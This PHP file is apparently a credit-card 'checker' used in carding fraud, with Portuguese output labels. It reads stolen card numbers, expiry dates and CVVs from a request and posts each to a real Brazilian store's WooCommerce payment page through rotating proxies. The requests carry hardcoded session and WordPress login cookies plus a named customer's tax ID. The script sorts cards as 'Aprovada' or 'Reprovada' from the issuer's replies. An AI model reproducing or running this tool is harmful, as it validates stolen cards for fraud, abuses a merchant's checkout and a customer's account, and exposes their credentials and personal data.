<?php
error_reporting(0);
set_time_limit(0);

DeletarCookies();
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}
function multiexplode ($delimiters,$string){
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;}

function getStr2($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = $_GET['lista'];
$lista = str_replace(" ", "", $lista);
$separadores = array(",","|",":","'"," ","~","»");
$explode = multiexplode($separadores,$lista);
$cc = $explode[0];
$mes = $explode[1];
$ano = $explode[2];
$cvv = $explode[3];


$number1 = substr($cc,0,4);
$number2 = substr($cc,4,4);
$number3 = substr($cc,8,4);
$number4 = substr($cc,12,4);


function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

function proxy(){ 
$proxy = file("proxys.txt"); 
$myproxy = rand(0,sizeof($proxy)-1); 
$proxy = $proxy[$myproxy]; $proxy = substr($proxy, 0,(strlen($proxy)-1)); 
return $proxy; } 
$proxy = proxy();


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://deslize.com.br/finalizar-compra/order-pay/11891/?pay_for_order=true&key=wc_order_zoDaNyeMxzd8w');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 10; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
//'Kept Alive: false',
'Host: deslize.com.br',
'origin: https://deslize.com.br',
'content-type: application/x-www-form-urlencoded',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site: same-origin',
//'user-agent: ',
'sec-fetch-mode: navigate',
'referer: https://deslize.com.br/finalizar-compra/order-pay/11891/?pay_for_order=true&key=wc_order_zoDaNyeMxzd8w',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'cookie: PHPSESSID=cd7604eab790539a990587f7098abdd5;hustle_module_show_count-popup-1=1;wh-widget-cookie=1;_ga=GA1.3.381937240.1592793961;_gid=GA1.3.109167988.1592793961;_hjid=a029371b-9936-4ba5-97a5-3e16a6d5ce0e;_fbp=fb.2.1592793965171.52643610;_hjIncludedInSample=1;inc_optin_popup_long_hidden-1=1;__zlcmid=ypjECat0gmiCkC;_hjAbsoluteSessionInProgress=1;_sim_li=MTkyLjE2OC4wLjEyNywxNzkuMjIyLjE2LjIzOQ==;_sim_si=592719DC-3755-4819-A19F-1C4A7AE5F3E2;_sim_uuid=2B1EC993-8492-4736-A32C-0AAB71C81D93;wordpress_logged_in_f970d24970f79498e96f9a9e1fa42443=pedro%20gomes.monteiro%7C1594003971%7Cq2SB1dZmxGB6LnjItmcSpQ0H8YgVpgd1TjUllJksc6s%7Cd3fd6fe469c948ff0ff94afd565ae94378ab621302bd6145a3108b7c37b6630f;wp_woocommerce_session_f970d24970f79498e96f9a9e1fa42443=6359%7C%7C1592966913%7C%7C1592963313%7C%7C35a24a531d4ba72f1b55d32f484822d1',));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=loja5_woo_novo_erede&erede_api%5BdeviceFingerprintID%5D=9a96ef9858212bbf725d333a5335a9f220200622025342&erede_api%5Bbandeira%5D=visa&erede_api%5Btitular%5D=PEDRO+GOMES+MONTEIRO&erede_api%5Bfiscal%5D=70649037090&erede_api%5Bnumero%5D='.$cc.'&erede_api%5Bvalidade%5D='.$mes.'%2F'.$ano.'&erede_api%5Bcvv%5D=000&erede_api%5Bparcela%5D=MXwxfDE2Ny4yNnxkbWx6WVE9PXxNVFkzTGpJMnxiZWM5ZGVmM2MzNTJiZWI0NzA3MWE4YjAxYWI0ZmQwMw%3D%3D&woocommerce_pay=1&woocommerce-pay-nonce=e34fdbfd59&_wp_http_referer=%2Ffinalizar-compra%2Forder-pay%2F11891%2F%3Fpay_for_order%3Dtrue%26key%3Dwc_order_zoDaNyeMxzd8w');
$retorn = curl_exec($ch);

include("consultabin.php");
$bin = "$bandeira $banco $level $pais ($paiscode)";

if (strpos($retorn, 'Unauthorized. Identified moderate risk by the issuer.') !== false) {

    echo "<font size=2><span class='badge badge-danger'>#Reprovada ✖️ $lista $bin Retorno: Identified moderate risk #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Please try again.') !== false) {
   
   echo json_encode(array("status" => 40, "str" => "<font size=2><span class='badge badge-success'>Aprovada <i class='zmdi zmdi-check'></i></span> $cc $mes/ano $cvv | <small>$bin Retorno: Please try again</small>#Fredo.technology</font><br>"));
exit();

}elseif (strpos($retorn, 'Unauthorized. Transaction type not allowed for this card.') !== false) {

    echo "<font size=2><span class='badge badge-danger'>#Reprovada ✖️ $lista $bin Retorno: Transação não permitida. #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Invalid security code.') !== false) {

   echo json_encode(array("status" => 40, "str" => "<font size=2><span class='badge badge-success'>Aprovada <i class='zmdi zmdi-check'></i></span> $cc $mes/ano $cvv | <small>$bin</small>#Fredo.technology</font><br>"));
   exit();
   

}elseif (strpos($retorn, 'Unauthorized. Restricted card.') !== false) {

    echo "<font size=2><span class='badge badge-danger'>#Reprovada ✖️ $lista $bin Retorno: Cartão restrito. #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Value not allowed for this type of card.') !== false) {

    echo "<font size=2><span class='badge badge-danger'>#Reprovada ✖️ $lista $bin  Retorno: Valor não permitido para este tipo de cartão. #fredo.app";
    
}elseif (strpos($retorn, 'Unauthorized. Expiry date expired.') !== false) {

   echo "<font size=2><span class='badge badge-danger'>#Reprovada ✖️ $lista $bin  Retorno: Data incorreta do cartão. #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Card Locked') !== false) {
      echo "<font size=2><span class='badge badge-danger'>#Reprovada ✖️ $lista $bin Retorno: Cartão bloqueado. #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Nonexistent card.') !== false){

      echo "<font size=2><span class='badge badge-danger'>#Reprovada ✖️ $lista $bin Retorno: Cartão não existe. #fredo.app";
      
}elseif (strpos($retorn, 'Error in issuer processing. Please try again') !== false) {
   
      echo "<font size=2><span class='badge badge-danger'>#Reprovada ✖️ $lista $bin Retorno: Error in issuer processing. #fredo.app";
      
}elseif (strpos($retorn, 'Product or service disabled for this merchant. Contact Rede.') !== false) {

      echo "<font size=2><span class='badge badge-secondary'>#Reprovada ✖️ $lista $bin Retorno: Bin gringa não testa 🤣 #fredo.app";
      
}else{

    echo "<font size=2><span class='badge badge-info'>#Reprovada ✖️ $lista $bin Retorno: Sem mensagem adicionada ou expirou sessão. #fredo.app";
}
 
?>